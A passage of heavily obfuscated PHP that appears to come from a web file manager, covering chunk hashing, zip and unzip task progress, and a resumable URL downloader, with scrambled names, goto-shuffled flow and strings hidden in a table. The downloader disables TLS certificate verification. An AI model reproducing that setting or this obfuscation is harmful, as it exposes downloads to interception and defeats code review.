$B·ŸñƒÏÈ = $this->tempFile . $_SERVER[©][1989]; if (!$Fã½‹¥‘¿) { if (file_exists($B·ŸñƒÏÈ)) { @unlink($B·ŸñƒÏÈ); } return !0; } $this->statusData = $Fã½‹¥‘¿; return file_put_contents($B·ŸñƒÏÈ, json_encode($Fã½‹¥‘¿)); } private function initFileTemp() { $FêŸÙ¦‡ =& $_SERVER[©]; if (file_exists($this->tempFile)) { return; } $dÇøÄîğš… = fopen($this->tempFile, $FêŸÙ¦‡[1990]); fseek($dÇøÄîğš…, $this->in[$FêŸÙ¦‡[87]] - 1, SEEK_SET); fwrite($dÇøÄîğš…, $FêŸÙ¦‡[476]); fclose($dÇøÄîğš…); } public function checkChunk() { goto CÖ‹÷–¥ñÅ; CÖ‹÷–¥ñÅ: $EğÄÑ¡æªÇ =& $_SERVER[©]; $a©ÙŒ–ÀÜ = array(); CacheLock::lock($this->tempFile); goto c³Æ¸™Ùß; Bªø¯„”ÈŒ: return $a©ÙŒ–ÀÜ; goto c‚ÇòŒÊ‘; c³Æ¸™Ùß: $Dƒ¾¥ÏöÉ± = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Dƒ¾¥ÏöÉ±[$EğÄÑ¡æªÇ[1977]] as $fƒõĞ¢±) { $eì’¸êŒ²½ = $fƒõĞ¢±[$EğÄÑ¡æªÇ[174]]; if ($eì’¸êŒ²½) { $a©ÙŒ–ÀÜ[$EğÄÑ¡æªÇ[1991] . $fƒõĞ¢±[$EğÄÑ¡æªÇ[1033]]] = $eì’¸êŒ²½; } } goto Bªø¯„”ÈŒ; c‚ÇòŒÊ‘: } private function checkChunkHash($FƒˆÄÕÎÎ) { goto BŸŠÓÖ¦­Á; eë‚¤‹Ôù: $e«†œ¯—ÈŒ = !0; foreach ($FƒˆÄÕÎÎ[$bØ‡Ç¸ã²À[1977]] as $d‘å”§Ş¡) { fseek($DÁ–õèá’×, $d‘å”§Ş¡[$bØ‡Ç¸ã²À[1979]]); $bÒ«Úéİ÷‹ = PathDriverStream::hash($DÁ–õèá’×, $d‘å”§Ş¡[$bØ‡Ç¸ã²À[87]]); if ($d‘å”§Ş¡[$bØ‡Ç¸ã²À[174]] != $bÒ«Úéİ÷‹) { $e«†œ¯—ÈŒ = !1; break; } } fclose($DÁ–õèá’×); goto dÑñ·–Ôìå; BŸŠÓÖ¦­Á: $bØ‡Ç¸ã²À =& $_SERVER[©]; if (count($FƒˆÄÕÎÎ[$bØ‡Ç¸ã²À[1977]]) != $FƒˆÄÕÎÎ[$bØ‡Ç¸ã²À[1976]]) { return !1; } $A¸ÛºãÅ¾¡ = _get($this->in, $bØ‡Ç¸ã²À[1984]); goto Cä‘¶òÄæ; Cä‘¶òÄæ: $CÖëÙ„å¹‹ = _get($this->in, $bØ‡Ç¸ã²À[1992]); if (strlen($CÖëÙ„å¹‹) == 32 && IO::hashSimple($this->tempFile) == $A¸ÛºãÅ¾¡ && IO::hashMd5($this->tempFile) == $CÖëÙ„å¹‹) { return !0; } $DÁ–õèá’× = fopen($this->tempFile, $bØ‡Ç¸ã²À[1167]); goto eë‚¤‹Ôù; dÑñ·–Ôìå: return $e«†œ¯—ÈŒ; goto Dµ®¯™’÷é; Dµ®¯™’÷é: } public static function fileName() { goto a¤¹–ø…¸; a¤¹–ø…¸: $eÊò¼âğßé =& $_SERVER[©]; global $in; $AÛŠ­«ºÍï = isset($in[$eÊò¼âğßé[38]]) ? $in[$eÊò¼âğßé[38]] : $eÊò¼âğßé[43]; goto E÷Ìª­×½Œ; FÖùÔÓËİ†: return KodIO::clear($AÛŠ­«ºÍï); goto Dö“¥ÉÏ®æ; E÷Ìª­×½Œ: if (!empty($_FILES)) { $AÛŠ­«ºÍï = $AÛŠ­«ºÍï ? $AÛŠ­«ºÍï : $_FILES[$eÊò¼âğßé[177]][$eÊò¼âğßé[394]]; } if (!is_wap()) { return KodIO::clear($AÛŠ­«ºÍï); } $fçºŸœÙ = strtotime($in[$eÊò¼âğßé[1993]]); goto c±ä«ÆªÉÕ; c±ä«ÆªÉÕ: $fçºŸœÙ = $fçºŸœÙ ? $fçºŸœÙ : time(); $b“É¹ÅÀÏ = strtolower($AÛŠ­«ºÍï); if ($b“É¹ÅÀÏ == $eÊò¼âğßé[1994] || $b“É¹ÅÀÏ == $eÊò¼âğßé[1995]) { $AÛŠ­«ºÍï = date($eÊò¼âğßé[689], $fçºŸœÙ) . $eÊò¼âğßé[80] . $in[$eÊò¼âğßé[87]] . $eÊò¼âğßé[1626]; } else { if ($b“É¹ÅÀÏ == $eÊò¼âğßé[1996]) { $AÛŠ­«ºÍï = date($eÊò¼âğßé[689], $fçºŸœÙ) . $eÊò¼âğßé[80] . $in[$eÊò¼âğßé[87]] . $eÊò¼âğßé[1997]; } } goto FÖùÔÓËİ†; Dö“¥ÉÏ®æ: } private function errorInfo($dÖ†“ô˜ìº) { $D­¾ë–• =& $_SERVER[©]; $b†Ú©‘Î®‡ = array($D­¾ë–•[1998], $D­¾ë–•[1999], $D­¾ë–•[2000], $D­¾ë–•[2001], $D­¾ë–•[2002], $D­¾ë–•[2003], $D­¾ë–•[2004], $D­¾ë–•[2005]); return $dÖ†“ô˜ìº . $D­¾ë–•[14] . $b†Ú©‘Î®‡[$dÖ†“ô˜ìº]; } } goto cƒØ›ó…; Dˆ²æÛÄÍ×: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aÄ®¾ó¤§; aÄ®¾ó¤§: $D¦ëğà¹ =& $_SERVER[©]; parent::startAfter(); Hook::bind($D¦ëğà¹[1504], array($this, $D¦ëğà¹[1505])); goto E‹Å¬Ó†ƒ·; dÂšÇ‡ï˜: if (!$föÅ™Şéòì[$D¦ëğà¹[1338]]) { $föÅ™Şéòì[$D¦ëğà¹[1338]] = LNG($D¦ëğà¹[1508]); } goto E›¾ÂãâàÅ; E‹Å¬Ó†ƒ·: Hook::bind($D¦ëğà¹[1032], array($this, $D¦ëğà¹[1506])); $föÅ™Şéòì =& $this->task; $föÅ™Şéòì[$D¦ëğà¹[1507]] = $D¦ëğà¹[1037]; goto dÂšÇ‡ï˜; E›¾ÂãâàÅ: } protected function endAfter() { $C«£Å˜½ÙÃ =& $_SERVER[©]; parent::endAfter(); Hook::unbind($C«£Å˜½ÙÃ[1504], array($this, $C«£Å˜½ÙÃ[1505])); Hook::unbind($C«£Å˜½ÙÃ[1032], array($this, $C«£Å˜½ÙÃ[1506])); } public function updateAfter() { $c†‹ƒ¬ËŞº =& $_SERVER[©]; $aæ†Ì’• =& $this->task; if (!$aæ†Ì’•[$c†‹ƒ¬ËŞº[973]] || !$aæ†Ì’•[$c†‹ƒ¬ËŞº[697]]) { return; } if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1507]] == $c†‹ƒ¬ËŞº[1037]) { $C¤†ÍÙ†‹Î = 0; if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1479]]) { $C¤†ÍÙ†‹Î = $aæ†Ì’•[$c†‹ƒ¬ËŞº[1480]] / $aæ†Ì’•[$c†‹ƒ¬ËŞº[1479]]; } $aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]] = $C¤†ÍÙ†‹Î * 0.3; } else { if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1507]] == $c†‹ƒ¬ËŞº[310]) { $C¤†ÍÙ†‹Î = $aæ†Ì’•[$c†‹ƒ¬ËŞº[987]] / $aæ†Ì’•[$c†‹ƒ¬ËŞº[973]]; $aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]] = 0.3 + $C¤†ÍÙ†‹Î * 0.4; } else { if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1507]] == $c†‹ƒ¬ËŞº[113]) { $C³äµ“Ğà = 0; if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1481]] == $c†‹ƒ¬ËŞº[113]) { $C³äµ“Ğà = $aæ†Ì’•[$c†‹ƒ¬ËŞº[1480]]; } $C¤†ÍÙ†‹Î = ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1484]] + $C³äµ“Ğà) / $aæ†Ì’•[$c†‹ƒ¬ËŞº[697]]; $aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]] = 0.3 + 0.4 + $C¤†ÍÙ†‹Î * 0.3; } } } if ($aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]] > 0) { $AË’ãà’®Æ = timeFloat() - $aæ†Ì’•[$c†‹ƒ¬ËŞº[1437]] - $aæ†Ì’•[$c†‹ƒ¬ËŞº[1440]]; $aæ†Ì’•[$c†‹ƒ¬ËŞº[1441]] = $AË’ãà’®Æ * (1 - $aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]]) / $aæ†Ì’•[$c†‹ƒ¬ËŞº[1435]]; } } public function addFile($c«Ç¶»ò“™) { goto aŞøôÊ¼”Ç; dŒ¨œ˜¤³•: $this->update(); goto C†ˆ÷ˆ²‚ë; AÄª«ºàñ¼: $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[1477]] = $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[38]]; $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[1479]] = $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[87]]; $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[1480]] = 0; goto aÚœ‹š”Éí; aŞøôÊ¼”Ç: $B¿ä¶Ï²âÜ =& $_SERVER[©]; $c„„ÚÔİÒ¸ =& $this->task; $c÷î÷Å×îğ = IO::info($c«Ç¶»ò“™); goto AÄª«ºàñ¼; aÚœ‹š”Éí: $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[975]] = $B¿ä¶Ï²âÜ[1496]; $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[1481]] = $B¿ä¶Ï²âÜ[1037]; $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[697]] = $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[87]]; goto b‘‹Àãô; b‘‹Àãô: $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[973]] = 1; $b½²ÙÂô»Á = 0; $c„„ÚÔİÒ¸[$B¿ä¶Ï²âÜ[1488]] = array($B¿ä¶Ï²âÜ[1489] => $b½²ÙÂô»Á + 1, $B¿ä¶Ï²âÜ[394] => $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[38]], $B¿ä¶Ï²âÜ[85] => $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[85]], $B¿ä¶Ï²âÜ[474] => $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[474]] ? $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[474]] : $c÷î÷Å×îğ[$B¿ä¶Ï²âÜ[85]]); goto dŒ¨œ˜¤³•; C†ˆ÷ˆ²‚ë: } public function unzipAfter($D˜†Âº’Û) { goto b§¬˜áÍ‰Ü; D©ªÔ£ ‘: $FÌØ•¬òò = IO::infoWithChildren($D˜†Âº’Û); $bÛ—÷›çëİ = 0; $AàÂéñ®ğ…[$C’ôçæÕ²[1488]] = array($C’ôçæÕ²[1489] => $bÛ—÷›çëİ + 1, $C’ôçæÕ²[394] => $FÌØ•¬òò[$C’ôçæÕ²[38]], $C’ôçæÕ²[85] => $FÌØ•¬òò[$C’ôçæÕ²[85]], $C’ôçæÕ²[474] => $FÌØ•¬òò[$C’ôçæÕ²[474]] ? $FÌØ•¬òò[$C’ôçæÕ²[474]] : $FÌØ•¬òò[$C’ôçæÕ²[85]]); goto B¬ÎŒŞä³¿; B¬ÎŒŞä³¿: if ($FÌØ•¬òò[$C’ôçæÕ²[39]] == $C’ôçæÕ²[177]) { $AàÂéñ®ğ…[$C’ôçæÕ²[973]] = 1; } else { $AàÂéñ®ğ…[$C’ôçæÕ²[973]] = $FÌØ•¬òò[$C’ôçæÕ²[90]][$C’ôçæÕ²[88]]; } $AàÂéñ®ğ…[$C’ôçæÕ²[975]] = $C’ôçæÕ²[43]; $AàÂéñ®ğ…[$C’ôçæÕ²[1481]] = 0; goto fÔå•­ùñÊ; eÁõÊ‹ëß¸: $AàÂéñ®ğ…[$C’ôçæÕ²[1477]] = $C’ôçæÕ²[43]; $AàÂéñ®ğ…[$C’ôçæÕ²[1484]] = 0; $AàÂéñ®ğ…[$C’ôçæÕ²[697]] = $FÌØ•¬òò[$C’ôçæÕ²[87]]; goto FØ›•ö¨Ïİ; fÔå•­ùñÊ: $AàÂéñ®ğ…[$C’ôçæÕ²[987]] = 0; $AàÂéñ®ğ…[$C’ôçæÕ²[1479]] = 0; $AàÂéñ®ğ…[$C’ôçæÕ²[1480]] = 0; goto eÁõÊ‹ëß¸; FØ›•ö¨Ïİ: $this->update(); self::log($C’ôçæÕ²[1509] . json_encode(array($AàÂéñ®ğ…, $FÌØ•¬òò))); goto ešŠ»Ğ’À…; b§¬˜áÍ‰Ü: $C’ôçæÕ² =& $_SERVER[©]; $AàÂéñ®ğ… =& $this->task; $AàÂéñ®ğ…[$C’ôçæÕ²[1507]] = $C’ôçæÕ²[113]; goto D©ªÔ£ ‘; ešŠ»Ğ’À…: } public function nameParse($dÀˆÌ¨öÔ­) { goto bËäñùò‘Ó; a²æ¼à…¢Ê: $E˜²ÛÁâ¤å = get_path_this($dÀˆÌ¨öÔ­); if (strstr($E˜²ÛÁâ¤å, $eÍ™ã‹¡–Î[101])) { $BÃç´”ø¥[$eÍ™ã‹¡–Î[987]] += 1; $BÃç´”ø¥[$eÍ™ã‹¡–Î[973]] += 1; } $BÃç´”ø¥[$eÍ™ã‹¡–Î[1477]] = $dÀˆÌ¨öÔ­; goto eã±œ¤¤›Ì; eã±œ¤¤›Ì: $this->update(); goto c¨Ÿ«¥£ƒ´; bËäñùò‘Ó: $eÍ™ã‹¡–Î =& $_SERVER[©]; $BÃç´”ø¥ =& $this->task; if ($BÃç´”ø¥[$eÍ™ã‹¡–Î[1507]] == $eÍ™ã‹¡–Î[1037]) { $BÃç´”ø¥[$eÍ™ã‹¡–Î[1507]] = $eÍ™ã‹¡–Î[310]; $BÃç´”ø¥[$eÍ™ã‹¡–Î[1484]] = 0; $BÃç´”ø¥[$eÍ™ã‹¡–Î[697]] = 0; } goto a²æ¼à…¢Ê; c¨Ÿ«¥£ƒ´: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $dŞê¸¯İÎØ =& $_SERVER[©]; parent::startAfter(); Hook::bind($dŞê¸¯İÎØ[1510], array($this, $dŞê¸¯İÎØ[1505])); $e“öœ‹ò¡æ =& $this->task; $e“öœ‹ò¡æ[$dŞê¸¯İÎØ[1507]] = $dŞê¸¯İÎØ[1037]; if (!$e“öœ‹ò¡æ[$dŞê¸¯İÎØ[1338]]) { $e“öœ‹ò¡æ[$dŞê¸¯İÎØ[1338]] = LNG($dŞê¸¯İÎØ[1511]); } } protected function endAfter() { $E¸…‚ºãÆ =& $_SERVER[©]; parent::endAfter(); Hook::unbind($E¸…‚ºãÆ[1510], array($this, $E¸…‚ºãÆ[1505])); } public function updateAfter() { $c‰šÎùùä‘ =& $_SERVER[©]; $aÚĞĞÖ•’ë =& $this->task; if (!$aÚĞĞÖ•’ë[$c‰šÎùùä‘[973]] || !$aÚĞĞÖ•’ë[$c‰šÎùùä‘[697]]) { return; } if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1507]] == $c‰šÎùùä‘[1037]) { $e£–†›óÚŒ = $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1480]]; if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1481]] != $c‰šÎùùä‘[1037]) { $e£–†›óÚŒ = 0; } $fòòÒÊˆÁ = ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1484]] + $e£–†›óÚŒ) / $aÚĞĞÖ•’ë[$c‰šÎùùä‘[697]]; $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]] = $fòòÒÊˆÁ * 0.3; } else { if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1507]] == $c‰šÎùùä‘[310]) { $fòòÒÊˆÁ = $aÚĞĞÖ•’ë[$c‰šÎùùä‘[987]] / $aÚĞĞÖ•’ë[$c‰šÎùùä‘[973]]; $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]] = 0.3 + $fòòÒÊˆÁ * 0.5; } else { if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1507]] == $c‰šÎùùä‘[113]) { $fòòÒÊˆÁ = 0; if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1479]]) { $fòòÒÊˆÁ = $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1480]] / $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1479]]; } $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]] = 0.3 + 0.5 + $fòòÒÊˆÁ * 0.2; } } } if ($aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]] > 0) { $dƒæî¸Íé = timeFloat() - $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1437]] - $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1440]]; $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1441]] = $dƒæî¸Íé * (1 - $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]]) / $aÚĞĞÖ•’ë[$c‰šÎùùä‘[1435]]; } } public function copyFileStart($E­ù‚ñ»Ñ, $d¿‹À‹¦£™, $fÆõ‚Œ£, $b‰ù‰»£¬, $A¤øíñ´Ä, $aÁê¨óÑÒ£) { $e§ŠøŒ‰å½ =& $_SERVER[©]; parent::copyFileStart($E­ù‚ñ»Ñ, $d¿‹À‹¦£™, $fÆõ‚Œ£, $b‰ù‰»£¬, $A¤øíñ´Ä, $aÁê¨óÑÒ£); $A¢Í³Äæ =& $this->task; if ($A¢Í³Äæ[$e§ŠøŒ‰å½[1507]] == $e§ŠøŒ‰å½[310]) { $A¢Í³Äæ[$e§ŠøŒ‰å½[1507]] = $e§ŠøŒ‰å½[113]; } $this->update(); } public function copyFileEnd($F¶Õá¾‰•Æ, $fœë¬œ–‰ğ, $CÔ·ÛíŠå, $cæĞ–¥²‹ó, $A”ùºÛƒê, $Fôœù÷èæ») { $eğáŠª«ó‚ =& $_SERVER[©]; $b¨¹Š¤®Ù‘ =& $this->task; $b¨¹Š¤®Ù‘[$eğáŠª«ó‚[1480]] = $b¨¹Š¤®Ù‘[$eğáŠª«ó‚[1479]]; $b¨¹Š¤®Ù‘[$eğáŠª«ó‚[1484]] += $b¨¹Š¤®Ù‘[$eğáŠª«ó‚[1479]]; $b¨¹Š¤®Ù‘[$eğáŠª«ó‚[1481]] = $eğáŠª«ó‚[43]; $this->update(); } public function nameParse($b…Í£«ò³Ğ) { $dŞ—ÕÁ—ºÓ =& $_SERVER[©]; $Dâá†š«Ö© =& $this->task; if ($Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[987]] < $Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[973]]) { $EìÀÑ†è„ = get_path_this($b…Í£«ò³Ğ); if (strstr($EìÀÑ†è„, $dŞ—ÕÁ—ºÓ[101])) { $Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[987]] += 1; } } if ($Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[1507]] == $dŞ—ÕÁ—ºÓ[1037]) { $Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[1507]] = $dŞ—ÕÁ—ºÓ[310]; } $Dâá†š«Ö©[$dŞ—ÕÁ—ºÓ[1477]] = $b…Í£«ò³Ğ; $this->update(); } } class Downloader { static function start($fˆÍ‚…µÇÓ, $C‡§ˆô’Ÿ×, $Cµàæ‰Ì¦ = 10) { goto b—§•Šê÷Ø; d¿††¶ŸÕˆ: if ($FÔßâçŒÔÈ > $A´÷¢¿›š) { @unlink($C÷äËšÀÑ‹); } file_put_contents($f¬»Ãé×¼å, json_encode($C‡òÈòµñ)); $fâèÒÇîÕ– = self::fileDownloadCurl($fˆÍ‚…µÇÓ, $C‡§ˆô’Ÿ×, !0, $FÔßâçŒÔÈ, $A´÷¢¿›š); goto cø¼’ÙŸÁä; Cà‰öÄÂÈ¦: $C÷äËšÀÑ‹ = $C‡§ˆô’Ÿ× . $fÛ¦Œ§ğÑã[1513]; if (is_array($fˆÍ‚…µÇÓ)) { $eƒˆ¢šğğ¶ = $fˆÍ‚…µÇÓ; } else { $eƒˆ¢šğğ¶ = url_header($fˆÍ‚…µÇÓ); } $fˆÍ‚…µÇÓ = $eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[304]]; goto F§Ô¤Ã·ïï; F§Ô¤Ã·ïï: if (!$fˆÍ‚…µÇÓ) { return array($fÛ¦Œ§ğÑã[1029] => !1, $fÛ¦Œ§ğÑã[1031] => $fÛ¦Œ§ğÑã[1034]); } if (!$eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[1285]] || $eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[334]] == 0) { @unlink($C÷äËšÀÑ‹); @unlink($C‡§ˆô’Ÿ×); $fâèÒÇîÕ– = self::fileDownloadFopen($fˆÍ‚…µÇÓ, $C‡§ˆô’Ÿ×, $eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[334]]); if ($fâèÒÇîÕ–[$fÛ¦Œ§ğÑã[1029]]) { return $fâèÒÇîÕ–; } else { @unlink($C÷äËšÀÑ‹); @unlink($C‡§ˆô’Ÿ×); $fâèÒÇîÕ– = self::fileDownloadCurl($fˆÍ‚…µÇÓ, $C‡§ˆô’Ÿ×, !1, 0, $eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[334]]); @unlink($C÷äËšÀÑ‹); return $fâèÒÇîÕ–; } } $FÔßâçŒÔÈ = is_file($C÷äËšÀÑ‹) ? filesize($C÷äËšÀÑ‹) : 0; goto CñÑ…Ğ¸µù; cø¼’ÙŸÁä: if ($fâèÒÇîÕ–[$fÛ¦Œ§ğÑã[1029]]) { @unlink($f¬»Ãé×¼å); } return $fâèÒÇîÕ–; goto cÉç¦İÈØÊ; b—§•Šê÷Ø: $fÛ¦Œ§ğÑã =& $_SERVER[©]; if (!request_url_safe($fˆÍ‚…µÇÓ)) { return array($fÛ¦Œ§ğÑã[1029] => !1, $fÛ¦Œ§ğÑã[1031] => $fÛ¦Œ§ğÑã[1034]); } $f¬»Ãé×¼å = $C‡§ˆô’Ÿ× . $fÛ¦Œ§ğÑã[1512]; goto Cà‰öÄÂÈ¦; CñÑ…Ğ¸µù: $A´÷¢¿›š = intval($eƒˆ¢šğğ¶[$fÛ¦Œ§ğÑã[334]]); if (file_exists($C÷äËšÀÑ‹) && time() - filemtime($C÷äËšÀÑ‹) < 3) { return array($fÛ¦Œ§ğÑã[1029] => !1, $fÛ¦Œ§ğÑã[1031] => $fÛ¦Œ§ğÑã[1514]); } $C‡òÈòµñ = array(); goto D¦Üš·Ì³; D¦Üš·Ì³: if (is_file($f¬»Ãé×¼å)) { $díçˆŒ­µ™ = file_get_contents($f¬»Ãé×¼å); $C‡òÈòµñ = json_decode($díçˆŒ­µ™, 1); } if (file_exists($C‡§ˆô’Ÿ×) && $A´÷¢¿›š == filesize($C‡§ˆô’Ÿ×)) { @unlink($C÷äËšÀÑ‹); @unlink($f¬»Ãé×¼å); return array($fÛ¦Œ§ğÑã[1029] => !0, $fÛ¦Œ§ğÑã[1031] => $fÛ¦Œ§ğÑã[1515]); } if ($C‡òÈòµñ[$fÛ¦Œ§ğÑã[334]] != $A´÷¢¿›š) { $C‡òÈòµñ = array($fÛ¦Œ§ğÑã[334] => $A´÷¢¿›š); } goto d¿††¶ŸÕˆ; cÉç¦İÈØÊ: } static function fileDownloadFopen($A®ìŸ´¼, $b’Ûîƒ¥¹, $fšÇŠ¼Œ£ = 0) { $dğá¶‹–‚Ş =& $_SERVER[©]; @ini_set($dğá¶‹–‚Ş[1516], $dğá¶‹–‚Ş[1517]); $CÃŒºÁ°ëÉ = $b’Ûîƒ¥¹ . $dğá¶‹–‚Ş[1513]; set_timeout(); @unlink($CÃŒºÁ°ëÉ); if ($FÅäÍâê÷‚ = @fopen($A®ìŸ´¼, $dğá¶‹–‚Ş[1518])) { goto D åø³ƒõ‚; Fç£î¸¥Ç¶: return array($dğá¶‹–‚Ş[1029] => !0, $dğá¶‹–‚Ş[1031] => $dğá¶‹–‚Ş[695]); goto C›‘çºİæã; D¡ĞÍ²Ù£î: fclose($FÅäÍâê÷‚); self::checkGzip($CÃŒºÁ°ëÉ); if (!@rename($CÃŒºÁ°ëÉ, $b’Ûîƒ¥¹)) { usleep(round(rand(0, 1000) * 50)); @unlink($b’Ûîƒ¥¹); $F·áÓ”ÕÄ = @rename($CÃŒºÁ°ëÉ, $b’Ûîƒ¥¹); if (!$F·áÓ”ÕÄ) { return array($dğá¶‹–‚Ş[1029] => !1, $dğá¶‹–‚Ş[1031] => $dğá¶‹–‚Ş[1522]); } } goto Fç£î¸¥Ç¶; D åø³ƒõ‚: if (!($dõœÃœ¥ = @fopen($CÃŒºÁ°ëÉ, $dğá¶‹–‚Ş[1519]))) { return array($dğá¶‹–‚Ş[1029] => !1, $dğá¶‹–‚Ş[1031] => $dğá¶‹–‚Ş[1520]); } while (!feof($FÅäÍâê÷‚)) { if (!file_exists($CÃŒºÁ°ëÉ)) { fclose($dõœÃœ¥); return array($dğá¶‹–‚Ş[1029] => !1, $dğá¶‹–‚Ş[1031] => $dğá¶‹–‚Ş[1521]); } clearstatcache(); if ($fšÇŠ¼Œ£ > 0 && $fšÇŠ¼Œ£ == filesize(iconv_system($CÃŒºÁ°ëÉ))) { break; } fwrite($dõœÃœ¥, fread($FÅäÍâê÷‚, 1024 * 8), 1024 * 8); } fclose($dõœÃœ¥); goto D¡ĞÍ²Ù£î; C›‘çºİæã: } else { return array($dğá¶‹–‚Ş[1029] => !1, $dğá¶‹–‚Ş[1031] => $dğá¶‹–‚Ş[1523]); } } static function fileDownloadCurl($C™°²‚áö, $C°±’©¾, $c®«Ù†”Ë = false, $e›ÒÆ»«Û = 0, $aåŞËµ’§„ = 0) { goto CâÕƒù‚©; FÑ’âÑçÃ²: curl_close($Bâ¶ŠŞ); fclose($aåøœÂÁƒŒ); $dš¶ßÂ›Û” = filesize(iconv_system($aÓ£ë‚È²)); goto c§¡Ú‚×‹; dì‘¶ª‹ø: curl_setopt($Bâ¶ŠŞ, CURLOPT_NOPROGRESS, !1); curl_setopt($Bâ¶ŠŞ, CURLOPT_PROGRESSFUNCTION, $aô ê†İì”[1525]); curl_progress_start($Bâ¶ŠŞ); goto EêÁ‰ò¾°Ó; EêÁ‰ò¾°Ó: curl_setopt($Bâ¶ŠŞ, CURLOPT_USERAGENT, $aô ê†İì”[1517]); $B–ÍâÛ¥³Á = curl_exec($Bâ¶ŠŞ); curl_progress_end($Bâ¶ŠŞ); goto FÑ’âÑçÃ²; c§¡Ú‚×‹: if ($dš¶ßÂ›Û” < $aåŞËµ’§„ && $aåŞËµ’§„ != 0) { return array($aô ê†İì”[1029] => !1, $aô ê†İì”[1031] => $aô ê†İì”[1514]); } if ($B–ÍâÛ¥³Á && filesize($aÓ£ë‚È²) != 0) { self::checkGzip($aÓ£ë‚È²); if (!@rename($aÓ£ë‚È², $C°±’©¾)) { @unlink($C°±’©¾); $B–ÍâÛ¥³Á = @rename($aÓ£ë‚È², $C°±’©¾); if (!$B–ÍâÛ¥³Á) { return array($aô ê†İì”[1029] => !1, $aô ê†İì”[1031] => $aô ê†İì”[1526]); } } return array($aô ê†İì”[1029] => !0, $aô ê†İì”[1031] => $aô ê†İì”[695]); } return array($aô ê†İì”[1029] => !1, $aô ê†İì”[1031] => $aô ê†İì”[1527]); goto Bøª˜ŞùíÛ; F‰¬Ö’‹È: $aåøœÂÁƒŒ = @fopen($aÓ£ë‚È², $aô ê†İì”[977]); if (!$aåøœÂÁƒŒ) { return array($aô ê†İì”[1029] => !1, $aô ê†İì”[1031] => $aô ê†İì”[1524]); } $Bâ¶ŠŞ = curl_init($C™°²‚áö); goto cš›ŞŸÆäß; cš›ŞŸÆäß: if ($c®«Ù†”Ë) { curl_setopt($Bâ¶ŠŞ, CURLOPT_RANGE, $e›ÒÆ»«Û . $aô ê†İì”[715]); } curl_setopt($Bâ¶ŠŞ, CURLOPT_FILE, $aåøœÂÁƒŒ); curl_setopt($Bâ¶ŠŞ, CURLOPT_REFERER, get_url_link($C™°²‚áö)); goto B„¹ÌÈ«; CâÕƒù‚©: $aô ê†İì” =& $_SERVER[©]; $aÓ£ë‚È² = $C°±’©¾ . $aô ê†İì”[1513]; set_timeout(); goto F‰¬Ö’‹È; B„¹ÌÈ«: curl_setopt($Bâ¶ŠŞ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Bâ¶ŠŞ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Bâ¶ŠŞ, CURLOPT_SSL_VERIFYHOST, 0); goto dì‘¶ª‹ø; Bøª˜ŞùíÛ: } static function checkGzip($Eòøİâ¯­) { goto FãÔæÄéà; FãÔæÄéà: $CÔˆÛİ¡Äİ = $_SERVER[©][1528]; $C»®ƒ«‚ = file_sub_str($Eòøİâ¯­, 0, 2); if ($CÔˆÛİ¡Äİ != $C»®ƒ«‚) { return; } goto E Úº’Ãõ; E Úº’Ãõ: ob_start(); readgzfile($Eòøİâ¯­); $fñªÀÕĞÄ = ob_get_clean(); goto dœİº´¬ª®; dœİº´¬ª®: file_put_contents($Eòøİâ¯­, $fñªÀÕĞÄ); goto aÖâ„„¿¬Ü; aÖâ„„¿¬Ü: } } goto F±‡æöé®; c½¸ÒµÎà: class CacheLockRedis { public function lock($A½ñ…å¥³­, $eÚÃ„Òë = 10) { $F¼Àêƒ£åá = Cache::init(); 